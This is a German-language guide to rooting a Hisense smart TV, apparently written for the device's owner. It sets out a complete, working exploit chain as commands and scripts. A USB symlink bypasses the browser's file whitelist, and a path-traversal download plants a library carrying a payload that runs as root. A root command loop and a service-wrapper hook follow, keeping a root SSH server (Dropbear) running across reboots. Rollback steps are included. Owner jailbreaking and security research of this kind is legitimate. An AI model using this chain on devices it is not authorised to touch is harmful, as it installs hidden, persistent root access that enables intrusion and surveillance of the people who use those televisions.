# ROOT-GUIDE — Hisense HE40E5600FFWTS (V0100.01.00A.N0410)

**Finaler, replizierbarer Root-Weg.** Kein Flash, kein `.pkg`, kein UART, kein Öffnen des TVs.
**Ziel-TV:** Hisense HE40E5600FFWTS, FW `V0100.01.00A.N0410`, LAN `192.0.2.94`
**Host:** Linux mit Python 3, `arm-linux-gnueabihf-*`, optional `qemu-arm`; Host-IP im Beispiel `192.0.2.150`
**Stand:** 2026-10-26 — Root + Dropbear-SSH (key-only) + PTY live bestätigt; Boot-Persistenz installiert (Reboot-Test offen).

Dieser Ordner ist **self-contained**: Payload, Original-Lib, Dropbear-Binaries, Host-/TV-Skripte, Public Key, Host-Key-Fingerprint, Build-Skripte und die Doku liegen hier. Du musst nicht durch den alten Run-Ordner suchen. Die alte `docs/re/...`-Ablage ist nur noch Evidence/Provenienz.

---

## 0. Ergebnis

Beim Boot lädt `hisense_browser` (UID 0, Single-Process, `CapEff=0000003fffffffff`) eine präparierte **`libtvsysinfo.so`** aus `/3rd_rw/loglevel/lib`. Der angehängte `DT_INIT` läuft als root, schreibt den Proof, startet die Root-Loop und ruft danach den Original-Init auf. Über den `HamService`-Wrapper starten Root-Loop und Dropbear bei jedem Boot. SSH ist **key-only**; Login als `root` gibt eine echte Root-Shell mit PTY.

Beweis (live):

```
/3rd_rw/root_proof.txt = ROOT_EXEC_TVI
uid=0(root) gid=0(root)
Uid: 0 0 0 0   Gid: 0 0 0 0   CapEff: 0000003fffffffff
```

**Optional SFTP:** Dropbear bringt keinen eigenen `sftp-server` mit. Im Ordner
liegen ein **statischer OpenSSH-9.9p1-sftp-server** und ein Dropbear mit
`SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`; `root/scripts/host/install_sftp.sh`
installiert beides (Test auf 2222, dann Tausch auf 22). Danach:
`sftp root@192.0.2.94`. Siehe 9.4.

---

## 1. Die Kette (warum das geht)

1. **Browser ist root.** `hisense_browser` läuft als UID/GID 0, `CapEff` voll, Single-Process, kein Seccomp/NoNewPrivs. JS im Browser ist root-equivalent.
2. **USB-Schreibprimitive.** `HSJSX_File::IsSubDentry` prüft `realpath` + Präfix gegen `/3rd_rw/appdata`, `/dev/shm/shm_tmp`, `/3rd/launcher/data`. Ein **dangling Symlink** auf einem ext4-USB lässt `realpath` am fehlenden Ziel scheitern; der Elternpfad `/dev/shm/shm_tmp/mnt/usb/<dev>` ist erlaubt. `fopen` folgt dem Symlink und legt die Zieldatei als root an. Damit sind **neue Root-Dateien** überall anlegbar.
3. **Loader-Shadow.** `hisense_browser` hat `libtvsysinfo.so` als direktes `NEEDED`; `DT_RPATH=/lib/`, dort liegt sie nicht. `LD_LIBRARY_PATH`-Index 17 ist `/3rd_rw/loglevel/lib` — das erste Verzeichnis, das die Lib liefern kann. Die dort per Symlink-Bypass abgelegte `libtvsysinfo.so` wird beim nächsten Browser-Start geladen.
4. **DT_INIT-Payload.** Die echte `libtvsysinfo.so` wird um Code am Dateiende erweitert (RX-LOAD `p_filesz/memsz` mit erweitert); `DT_INIT` zeigt auf den neuen Code. Der Code:
   - `unlink` der eigenen Datei (Selbstschutz),
   - schreibt `/3rd_rw/root_proof.txt`,
   - `fork` + `execve("/bin/sh", ["/bin/sh", "/3rd_rw/appdata/root_loop.sh"], NULL)`,
   - ruft den Original-`DT_INIT` per PC-relativem `bl` auf,
   - kehrt zum Loader zurück.
5. **Root-Loop.** `/3rd_rw/appdata/root_loop.sh` läuft als root, liest `root_cmd.sh`, führt sie aus und schreibt `root_out.txt`.
6. **SSH-Persistenz.** `/3rd_rw/hamservice/HamService` ist ein Wrapper: startet Root-Loop + Dropbear, führt danach das echte `/3rd/hamservice/HamService` aus. `startHam.sh` ruft ihn beim Boot als root auf. Dropbear nutzt ein bind-gemountetes `/etc/passwd` (Root-Home `/3rd_rw/sshd/home`) und `~/.ssh/authorized_keys`. PTYs kommen aus einem devpts-Mount auf `/dev/shm/pts`, der auf `/dev/pts` gebindet wird.

---

## 2. Ordner / Artefakte

```
root/
  ROOT-GUIDE.md                 # diese Datei
  README.md                     # kurzer Index
  tools/
    server.py                   # Host: recon.html + /pub + /cmd + /recon + /dump
    recon.html                  # Host: TV-Seite mit fileXHR/listDir/HiBrowser-Hook
    live_cmd.txt                # optionaler Live-Command-Kanal (leer = nichts)
    pub/
      libtvsysinfo.so           # finaler Payload (33500 B)
      dropbear                  # statischer ARM-Dropbear 2022.83 (key-only)
      dropbear-sftp             # Dropbear mit SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server
      dropbearkey
      sftp-server               # statischer OpenSSH 9.9p1 sftp-server
      authorized_keys           # dein Public Key
      start_sshd.sh             # TV: Dropbear + passwd/PTY-Bindmounts
      root_loop.sh              # TV: Root-Kommandokanal
      hamservice-wrapper.sh     # TV: Boot-Hook, ersetzt /3rd_rw/hamservice/HamService
      deploy_sshd.sh            # TV: installiert alles (als root ausführen)
      verify.sh                 # TV: Health-Check
      rollback.sh               # TV: alles zurückbauen
  scripts/
    host/
      prepare_usb.sh            # Host: ext4/MBR-Stick + Symlinks
      start_http.sh             # Host: Server auf :9000
      plant_payload.js          # TV-Konsole: Payload durch tvi schreiben
      upload_to_appdata.js      # TV-Konsole: Dropbear/Deploy-Dateien nach appdata
      run_root_cmd.js           # TV-Konsole: root_cmd.sh schreiben/root_out lesen
      build_payload.sh          # Host: Payload aus tvi_original.so bauen
      build_tvi_payload.py      # Host: Builder (deterministisch)
      build_dropbear.sh         # Host: Dropbear aus sources/ bauen
      build_sftp_server.sh      # Host: statischen sftp-server bauen
      patch_dropbear_sftp.py    # Host: Dropbear-SFTP-Pfad patchen
      install_sftp.sh           # Host: SFTP installieren/testen/auf 22 tauschen
    tv/
      start_sshd.sh
      root_loop.sh
      hamservice-wrapper.sh
      deploy_sshd.sh
      verify.sh
      rollback.sh
      install_sftp_stage.sh     # TV: sftp-server + Test-Dropbear auf 2222
      enable_sftp.sh            # TV: Tausch auf 22 planen
      swap_sftp.sh              # TV: Tausch ausführen (detached)
  artifacts/
    tvi_original.so             # Original /3rd_rw/tvsysinfo/lib/libtvsysinfo.so (33220 B)
    keys/authorized_keys        # dein Public Key
    keys/host-key-fingerprint.txt
sources/
  dropbear-2022.83.tar.bz2      # Offline-Buildquelle (SHA unten)
  openssh-9.9p1.tar.gz          # Offline-Buildquelle für sftp-server
modding/                        # die Modding-Doku (eigene Abteilung)
dead-ends.md                    # kurze Liste der Sackgassen
SHA256SUMS
```

**Wichtig:** `root/tools/pub/authorized_keys` enthält **nur** deinen Public Key. Der private Key bleibt auf deinem Rechner und ist nirgends in diesem Ordner.

---

## 3. Voraussetzungen

- TV im LAN, erreichbar als `192.0.2.94` (IP ggf. anpassen).
- Host im selben LAN; Python 3; für den Rebuild: `gcc-arm-linux-gnueabihf`, `binutils-arm-linux-gnueabihf`, `make`, `bzip2`.
- Optional SFTP: OpenSSH-Client (`sftp`) auf dem Host; der TV braucht keinen Client.
- USB-Stick, **ext4 mit MBR-Partitionstabelle** (kein Superfloppy). Der TV mountet Partitionen.
- Der Public Key in `root/tools/pub/authorized_keys` muss zu deinem privaten Key passen. Aktuell:
  ```
  <your-public-key>
  ```
- Host-Key des TV-SSHD (Ed25519):
  ```
  <host-key-fingerprint>
  ```

---

## 4. Der Weg in Kürze

```
1. USB-Stick:   sudo root/scripts/host/prepare_usb.sh /dev/sdX
2. Server:      root/scripts/host/start_http.sh
3. TV-Seite:    http://<host-ip>:9000/recon.html
4. Payload:     root/scripts/host/plant_payload.js  (USB-Dev anpassen) → Reboot
5. Root prüfen: /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
6. SSH-Dateien: root/scripts/host/upload_to_appdata.js
7. Deploy:      root/scripts/host/run_root_cmd.js  → deploy_sshd.sh
8. Verbinden:   ssh root@192.0.2.94
9. Persistenz:  HamService-Wrapper ist installiert; Reboot-Test
10. Rollback:   root/scripts/tv/rollback.sh (auf dem TV, als root)
11. SFTP opt.:  root/scripts/host/install_sftp.sh
```

Die Schritte im Detail:

---

## 5. Schritt 1 — USB-Stick (ext4 + MBR + `tvi`-Symlink)

### 5.1 Skript

```bash
cd <repo-root>
sudo root/scripts/host/prepare_usb.sh /dev/sdX
```

Das Skript ist **destruktiv**: `wipefs`, MBR, `mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM`, dann:

```
tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (Pflicht, muss dangling bleiben)
pwn -> /3rd_rw/root_proof.txt                  (optional, Proof-Target)
```

### 5.2 Manuell (falls du es selbst machen willst)

```bash
lsblk -f
sudo wipefs -a /dev/sdX
sudo parted -s /dev/sdX mklabel msdos mkpart primary ext4 1MiB 100%
sudo mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM /dev/sdX1
sudo mkdir -p /mnt/data
sudo mount /dev/sdX1 /mnt/data
sudo ln -sfn /3rd_rw/loglevel/lib/libtvsysinfo.so /mnt/data/tvi
sudo ln -sfn /3rd_rw/root_proof.txt                /mnt/data/pwn
sync
sudo umount /mnt/data
```

- **`tvi` muss dangling sein** (Ziel existiert noch nicht). Genau das ist der Whitelist-Bypass.
- FAT32 kann keine Symlinks; ext4 mit alter Feature-Menge (`^64bit,^metadata_csum`) wird vom 3.18-Kernel gemountet.
- Ein Whole-Disk-ext4 (Superfloppy, kein `sdX1`) wird **nicht** gemountet.

Dann Stick in den TV. Der TV mountet ihn als `/dev/shm/shm_tmp/mnt/usb/<dev>` (für JS sichtbar als `/mnt/usb/<dev>`, z. B. `sda1`/`sdb1`/`sdc1`).

---

## 6. Schritt 2 — Host-Server + Recon-Seite

```bash
cd <repo-root>
root/scripts/host/start_http.sh
# TV URL: http://<host-ip>:9000/recon.html
```

Der Server liefert `recon.html`, `/cmd`, `/recon`, `/dump` und `/pub/*`. Die TV-Seite pollt `/cmd` und führt JS im **root-Browser** aus.

Auf dem TV im Browser öffnen:

```
http://<host-ip>:9000/recon.html
```

USB-Dev ermitteln (Konsole/Hook):

```js
listDir("/mnt/usb")          // z. B. "[D] sda1"
listDir("/mnt/usb/sda1")     // muss "tvi" zeigen
```

---

## 7. Schritt 3 — Payload schreiben

### 7.1 Skript (TV-Konsole)

`root/scripts/host/plant_payload.js` in die Konsole pasten; **`usb` anpassen**:

```js
var usb = "/mnt/usb/sda1";                 // <-- aus listDir("/mnt/usb")
var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
var url = location.origin + "/pub/libtvsysinfo.so";
var o = {};
o.download = HiBrowser.File.download(url, target, 1);
o.back = HiBrowser.File.download("file:///3rd_rw/loglevel/lib/libtvsysinfo.so",
                                 "tvi_check_plant.so", 1);
o
```

Erwartung: `download=0`, `back=0`; danach existiert

```
/3rd_rw/loglevel/lib/libtvsysinfo.so   33500 B
SHA-256 37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a
```

### 7.2 Manuell (ohne JS-Datei)

```js
HiBrowser.File.download(
  "http://<host-ip>:9000/pub/libtvsysinfo.so",
  "so/../../../../dev/shm/shm_tmp/mnt/usb/sda1/tvi",
  1
);
```

### 7.3 Verifizieren

- `back=0` und die 33.500 B / SHA oben.
- Optional die zurückgelesene Datei `tvi_check_plant.so` mit `pub/libtvsysinfo.so` vergleichen.
- **Nicht rebooten**, bevor die Bytes stimmen.

### 7.4 Reboot

TV komplett aus- und wieder einschalten. Beim Boot lädt `hisense_browser` die Shadow-Lib aus Index 17; der `DT_INIT` läuft als root.

---

## 8. Schritt 4 — Root prüfen / Kommandokanal

Nach dem Boot Recon-Seite erneut öffnen.

```js
fileXHR("file:///3rd_rw/root_proof.txt")         // ROOT_EXEC_TVI
fileXHR("file:///3rd_rw/appdata/root_loop.pid")  // z. B. 1425
listDir("/3rd_rw/loglevel/lib")                  // nur liblogLevel.so => Self-Unlink ok
```

Root-Befehl über den Loop:

```js
HiBrowser.File.write("root_cmd.sh",
  "id\n" +
  "cat /proc/self/status | grep -E '^(Uid|Gid|CapEff):'\n", 1);

// nach ca. 2 s:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

Erwartung:

```
uid=0(root) gid=0(root)
Uid: 0 0 0 0
Gid: 0 0 0 0
CapEff: 0000003fffffffff
```

Fertiges Snippet: `root/scripts/host/run_root_cmd.js` (CMD anpassen).

---

## 9. Schritt 5 — Dropbear/SSH installieren

### 9.1 Dateien nach `/3rd_rw/appdata` laden

`root/scripts/host/upload_to_appdata.js` in die TV-Konsole pasten. Es lädt aus `root/tools/pub/`:

```
dropbear dropbearkey authorized_keys start_sshd.sh root_loop.sh
hamservice-wrapper.sh deploy_sshd.sh verify.sh rollback.sh
```

nach `/3rd_rw/appdata`. Erwartung: alle Werte `0`.

### 9.2 Deploy als root (über die Root-Loop)

`root/scripts/host/run_root_cmd.js` mit

```
/bin/sh /3rd_rw/appdata/deploy_sshd.sh
```

ausführen (oder in der Konsole):

```js
HiBrowser.File.write("root_cmd.sh", "/bin/sh /3rd_rw/appdata/deploy_sshd.sh\n", 1);
// nach ca. 5 s:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

`deploy_sshd.sh` macht:

- `dropbear`/`dropbearkey` → `/3rd_rw/sshd/`
- Host-Key (`dropbearkey -t ed25519 -f /3rd_rw/sshd/host_key`)
- `/etc/passwd`-Kopie mit `root:/3rd_rw/sshd/home:/bin/sh`, **bind mount** über `/etc/passwd`
- devpts auf `/dev/shm/pts`, **bind mount** über `/dev/pts` (PTY; `/dev` ist statisch ro)
- `authorized_keys` aus dem Public Key
- `start_sshd.sh` + `root_loop.sh` + `hamservice-wrapper.sh`
- Start von Dropbear auf `0.0.0.0:22`, key-only
- Health-Ausgabe (Prozesse, Port, Log, Host-Key, Mounts)

### 9.3 Verbinden

```bash
ssh root@192.0.2.94
# oder, wenn dein Key nicht der Default ist:
ssh -i ~/.ssh/<dein_privater_key> root@192.0.2.94
```

Beim ersten Verbinden Host-Key bestätigen:

```
ED25519 key fingerprint is <host-key-fingerprint>
```

Erwartung: `root@...:~#`, `id` → `uid=0(root)`.

**Key-only:** `DROPBEAR_SVR_PASSWORD_AUTH=0` beim Build; es gibt keinen Passwort-Login. Dein Public Key ist der einzige Zugang.

**PTY:** devpts-Workaround ist im `start_sshd.sh`/`deploy_sshd.sh`. Falls doch `PTY allocation failed`:

```sh
mkdir -p /dev/shm/pts
mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts
mount --bind /dev/shm/pts /dev/pts
```

Danach erneut verbinden; Dropbear muss nicht neu starten. Fallback ohne PTY:

```bash
ssh -T root@192.0.2.94 'id; uname -a'
```

### 9.4 SFTP (optional, key-only)

Dropbear hat **keinen eigenen sftp-server**; der Server exec't den
compile-time `SFTPSERVER_PATH` (Default `/usr/libexec/sftp-server`). Der ro
Rootfs erlaubt dort keine Datei. Deshalb liegen im Ordner:

- `tools/pub/sftp-server` — statischer OpenSSH-9.9p1-sftp-server (ARM)
- `tools/pub/dropbear-sftp` — Dropbear mit
  `SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`

Installation vom Host (nutzt deinen SSH-Key; ein `sftp`-Client wird nur für den Test benötigt):

```bash
cd <repo-root>
root/scripts/host/install_sftp.sh
# optional: TV=root@192.0.2.94 SSH_KEY=~/.ssh/id_ed25519 ...
```

Ablauf: lädt beide Binaries nach `/3rd_rw/appdata`; startet einen
**Test-Dropbear auf Port 2222** (Port 22 bleibt unangetastet); testet
`sftp -P 2222`; nur bei Erfolg wird der Binary auf 22 getauscht
(Backup: `/3rd_rw/sshd/dropbear.nosftp`). Danach:

```bash
sftp root@192.0.2.94
# pwd, ls, put, get ...
```

**Rollback:**

```bash
ssh root@192.0.2.94 \
  'cp -f /3rd_rw/sshd/dropbear.nosftp /3rd_rw/sshd/dropbear; \
   kill $(cat /3rd_rw/sshd/dropbear.pid) 2>/dev/null; \
   /bin/sh /3rd_rw/sshd/start_sshd.sh'
```

**SFTP ist root-equivalent** (Login als root), key-only, nur LAN. Es ist
derselbe Zugang wie SSH; keine zusätzlichen Credentials.

---

## 10. Schritt 6 — Persistenz (Boot)

`deploy_sshd.sh` installiert bereits `/3rd_rw/hamservice/HamService`:

```sh
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/basic/bin
export PATH
/bin/sh /3rd_rw/appdata/root_loop.sh >/dev/null 2>&1 &
[ -x /3rd_rw/sshd/start_sshd.sh ] && /bin/sh /3rd_rw/sshd/start_sshd.sh >/dev/null 2>&1 &
exec /3rd/hamservice/HamService "$@"
```

Boot-Ablauf:

1. `startHam.sh` wechselt nach `/3rd_rw/hamservice`.
2. `[ -e HamService ] && [ -x HamService ]` → `./HamService &`.
3. Wrapper startet Root-Loop + Dropbear (Bind-Mounts/PTY), `exec`t dann das echte `/3rd/hamservice/HamService`.
4. Root-Loop und Dropbear laufen als root weiter.

**Reboot-Test:** TV neu starten; danach:

```bash
ssh root@192.0.2.94 'id; ps | grep -E "dropbear|root_loop"'
```

Oder auf dem TV: `/bin/sh /3rd_rw/appdata/verify.sh`.

**Alternative für frühe Mods:** `/3rd_rw/developer.sh` (wird von `/basic/autorun.sh` Zeile 90 als root ausgeführt, **vor** `ms_service`/`hisenseUI`/`app_man`/`delayrun`). Siehe `modding/02-boot.md` und `modding/04-modding.md`.

---

## 11. Schritt 7 — Rollback

### 11.1 Skript (TV, als root)

```sh
/bin/sh /3rd_rw/appdata/rollback.sh
# oder aus diesem Ordner hochladen und ausführen
```

Es stoppt Loop/Dropbear, stellt den HamService-Symlink wieder her, unmountet `/etc/passwd`/`/dev/pts`/`/dev/shm/pts`, entfernt `/3rd_rw/sshd`, die Shadow-Lib und die alten ms-/appdata-Payloads. Danach Reboot.

### 11.2 Manuell

```sh
kill "$(cat /3rd_rw/appdata/root_loop.pid)" 2>/dev/null
kill "$(cat /3rd_rw/sshd/dropbear.pid)" 2>/dev/null
rm -f /3rd_rw/hamservice/HamService
ln -s /3rd/hamservice/HamService /3rd_rw/hamservice/HamService
umount /etc/passwd 2>/dev/null
umount /dev/pts 2>/dev/null
umount /dev/shm/pts 2>/dev/null
rm -rf /3rd_rw/sshd
rm -f /3rd_rw/loglevel/lib/libtvsysinfo.so
sync
reboot
```

Der ro Rootfs ist unverändert; die Original-`libtvsysinfo.so` bleibt unter `/3rd_rw/tvsysinfo/lib`. Kein Flash, kein `.pkg`.

---

## 12. Troubleshooting

| Problem | Ursache / Lösung |
|---|---|
| `PTY allocation request failed` / `openpty: No space left on device` | `/dev/pts` ist nicht devpts. `mkdir -p /dev/shm/pts; mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts; mount --bind /dev/shm/pts /dev/pts`. Erneut verbinden. |
| `Permission denied (publickey)` | `grep '^root:' /etc/passwd` muss `/3rd_rw/sshd/home:/bin/sh` zeigen (Bind-Mount). `authorized_keys` 600, `.ssh` 700, Home 700. `cat /3rd_rw/sshd/dropbear.log`. |
| `Connection refused` | Dropbear läuft nicht: `ps | grep dropbear`, `cat /3rd_rw/sshd/dropbear.log`, `/bin/sh /3rd_rw/sshd/start_sshd.sh`. Port 22: `/proc/net/tcp` (`:0016`). |
| Host-Key-Warnung | `ssh-keygen -R 192.0.2.94`; Fingerprint `SHA256:7tFL…` bestätigen. |
| Recon-Seite weg | TV-Browser neu öffnen: `http://<host-ip>:9000/recon.html`. SSH/Root-Loop laufen unabhängig. |
| Nach Reboot kein SSH | `/3rd_rw/hamservice/HamService` (Wrapper, 755), `/3rd_rw/sshd/start_sshd.sh`, `dropbear.log`, `mount.log` prüfen. `startHam.sh` startet den Wrapper. |
| Root-User nicht gefunden | `/etc/passwd`-Bind fehlt: `mount --bind /3rd_rw/sshd/etc_passwd /etc/passwd`; `grep '^root:' /etc/passwd`. |
| Kein Root nach Payload | Datei 33.500 B/SHA prüfen; `/3rd_rw/loglevel/lib/libtvsysinfo.so` vorhanden; Browser neu starten; Index 17. |
| `dropbear: Invalid option -s` | Dieser Build hat kein `-s`; Passwort-Auth ist **compile-time** aus. `-s` aus dem Startskript entfernen (hier bereits nicht enthalten). |
| `sh: /usr/libexec/sftp-server: No such file` | Der Dropbear ist noch der ungepatchte. `root/scripts/host/install_sftp.sh` ausführen; prüfen: `grep -a 'sftp-server' /3rd_rw/sshd/dropbear` → `/3rd_rw/sshd/sftp-server`. |
| SFTP auf 2222 scheitert | `/3rd_rw/sshd/dropbear2222.log` prüfen; Port 22 wurde nicht angefasst. |
| SFTP auf 22 scheitert | `/3rd_rw/sshd/swap.log`, `/3rd_rw/sshd/dropbear.log`; Rollback-Befehl in 9.4. |

Dead Ends und verworfene Wege: `../dead-ends.md` (kurz).

---

## 13. Artefakte und Hashes

| Artefakt | Pfad | Größe / SHA-256 |
|---|---|---|
| Original `libtvsysinfo.so` | `artifacts/tvi_original.so` | 33.220 B / `36ddee4782cdcff7a0f1d94e8b3491ea6fe228d13bfef3ea137a98f142ff3b7c` |
| Root-Payload | `tools/pub/libtvsysinfo.so` | 33.500 B / `37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a` |
| Dropbear | `tools/pub/dropbear` | 882.204 B / `976ec57e401765d5fc9c0a201d19c997c004dcf91a8d4bdb039bbb8419071eae` |
| Dropbearkey | `tools/pub/dropbearkey` | 755.452 B / `3fbfa60891b3a9f3e971a24071ed4d14c93ee3e773dd6f4969646cc811b0dbbf` |
| Dropbear-Quelle | `sources/dropbear-2022.83.tar.bz2` | `bc5a121ffbc94b5171ad5ebe01be42746d50aa797c9549a4639894a16749443b` |
| SFTP-Server | `tools/pub/sftp-server` | 635.680 B / `d0f7700e84e582aef3948c29e4317fb0119e13393374a7455922ffa8d01202f3` |
| Dropbear (SFTP) | `tools/pub/dropbear-sftp` | 882.204 B / `a21b0d3e53dd1d124105350319df45a2b44e7cef70dd29b418644b11fdcfed57` |
| OpenSSH-Quelle | `sources/openssh-9.9p1.tar.gz` | `b343fbcdbff87f15b1986e6e15d6d4fc9a7d36066be6b7fb507087ba8f966c02` |
| Host-Key (SSH) | TV: `/3rd_rw/sshd/host_key` | Ed25519 / `<host-key-fingerprint>` |
| Dein Auth-Key | `tools/pub/authorized_keys` | Fingerprint `<host-key-fingerprint>` |
| Root-Proof | TV: `/3rd_rw/root_proof.txt` | `ROOT_EXEC_TVI\n` |
| Root-Loop | TV: `/3rd_rw/appdata/root_loop.sh` | PID: `/3rd_rw/appdata/root_loop.pid` |

`SHA256SUMS` im Top-Level: `cd <repo-root> && sha256sum -c SHA256SUMS`.

---

## 14. Sicherheit / Grenzen

- **SSH ist key-only, root, im LAN.** Kein Passwort-Login; der private Key ist der einzige Zugang. Nicht ins Internet exponieren.
- **SFTP ist optional und root-equivalent.** Key-only wie SSH; der sftp-server läuft als root. Installation testet zuerst Port 2222; Backup `/3rd_rw/sshd/dropbear.nosftp`; Rollback in 9.4.
- **Der Root-Loop ist root-equivalent.** Wer `/3rd_rw/appdata/root_cmd.sh` schreiben kann (der Browser läuft als root), kann Root-Befehle ausführen. Gewollt, aber entsprechend behandeln.
- **Kein Flash, kein `.pkg`, kein Bootloader.** Rootfs und `/3rd` sind squashfs-ro; Änderungen liegen in `/3rd_rw` (rw), `/data` (rw), `/perm` (rw) und in Bind-Mounts.
- **`/etc/passwd`-Bind** ändert nur die Laufzeit-Sicht (Root-Home/Shell); die ro Originaldatei bleibt unverändert. Ein Reboot ohne Startskript stellt den Originalzustand her.
- **Persistenz** kommt vom `HamService`-Wrapper (und ggf. `developer.sh`). Der `libtvsysinfo`-Shadow löscht sich selbst.
- **Firmware-Updates** können Pfade/Verhalten ändern; danach Loader-Reihenfolge, HamService-Hook und `/3rd_rw` prüfen.
- **Keine Secrets im Ordner:** kein Root-Hash, kein privater SSH-Key. Nur Public Key + Host-Fingerprint.

---

## 15. Verifikationsstatus

| Punkt | Status |
|---|---|
| Browser root (UID 0, CapEff full) | **CONFIRMED live** |
| USB-ext4-Symlink-Bypass | **CONFIRMED live** (`/3rd_rw/root_proof.txt`) |
| `libtvsysinfo`-Shadow / DT_INIT | **CONFIRMED live** (`ROOT_EXEC_TVI`, Self-Unlink) |
| Root-Loop / Kommandokanal | **CONFIRMED live** (`uid=0`, `root_out.txt`) |
| Dropbear-SSH, Port 22 | **CONFIRMED live** (`00000000:0016`) |
| SSH-Pubkey-Auth als root | **CONFIRMED live** (`Pubkey auth succeeded for 'root'`) |
| PTY / interaktive Shell | **CONFIRMED live** (Session pts/0; `busybox script` → `uid=0(root)`) |
| SFTP (optional) | static sftp-server + patched Dropbear; Installer testet 2222 vor 22; **TV-Test nach Install** |
| Boot-Persistenz (HamService-Wrapper) | eingerichtet; Reboot-Test in dieser Doku beschrieben |
| Payload-Build reproduzierbar | **CONFIRMED** (`build_tvi_payload.py` → exakt `37b13f…`) |

**Scripts:** `tools/pub/*` ist der ausgelieferte Stand; `scripts/tv/*` die Quelle. `deploy_sshd.sh` entspricht dem manuell live ausgeführten Setup. `prepare_usb.sh`/`start_http.sh`/`plant_payload.js`/`upload_to_appdata.js`/`run_root_cmd.js` sind die Host-/TV-Helfer. `build_dropbear.sh` baut die in `tools/pub` liegenden Binaries reproduzierbar aus `sources/`; `build_sftp_server.sh` baut den statischen sftp-server; `install_sftp.sh` installiert/testet SFTP.

Viel Erfolg. Und: erst backupen, dann modden. :)
